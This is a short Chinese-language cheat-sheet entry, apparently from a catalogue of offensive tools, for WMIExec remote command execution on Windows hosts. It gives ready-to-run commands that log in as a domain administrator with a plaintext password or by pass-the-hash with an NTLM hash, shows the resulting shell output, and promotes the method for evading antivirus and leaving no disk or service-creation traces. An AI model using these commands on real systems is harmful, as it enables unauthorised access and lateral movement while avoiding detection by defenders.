### WMIExec

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `RCE` `WMI` `免杀` |

## WMIExec 远程命令执行

### 使用明文密码连接
```bash
bash wmiexec.sh contoso.com/administrator:Admin@123@192.168.1.10
```

### 使用 NTLM Hash 连接 (PTH)
```bash
bash wmiexec.sh contoso.com/administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### 执行命令
```bash
C:\> whoami
contoso\administrator
```

- ✓ 利用 WMI 协议执行命令，免杀效果好
- ✓ 不接触磁盘，无服务创建记录
- 获取管理员权限 (非 SYSTEM)
